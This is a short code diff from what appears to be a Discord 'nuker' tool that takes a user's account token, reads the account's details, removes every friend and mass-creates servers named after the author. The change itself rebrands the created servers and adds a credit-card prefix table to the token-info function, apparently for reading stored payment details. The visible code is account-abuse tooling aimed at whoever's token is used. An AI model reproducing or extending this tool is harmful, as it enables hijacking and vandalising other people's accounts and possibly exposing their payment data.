@@ -46,6 +46,7 @@ class Login(discord.Client):
 def tokenInfo(token):
     headers = {'Authorization': token, 'Content-Type': 'application/json'}  
     r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
+    cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
     if r.status_code == 200:
             userName = r.json()['username'] + '#' + r.json()['discriminator']
             userID = r.json()['id']
@@ -163,9 +164,9 @@ def tokenFuck(token):
         print(f" {Fore.RESET}[{Fore.YELLOW}NUKER{Fore.RESET}] Removed friend. ID: {friend}")
 
     for i in range(1):
-        payload = {'name': f'Shinner | github.com/madebyzuoa', 'region': 'us-east', 'icon': None, 'channels': None}
+        payload = {'name': f'Shinner | madebyzuoa.github.io', 'region': 'us-east', 'icon': None, 'channels': None}
         requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
-        
+
     print(f" {Fore.RESET}[{Fore.GREEN}NUKER{Fore.RESET}] Nuking complete.")
     input(" Press enter to return.")
     clear()
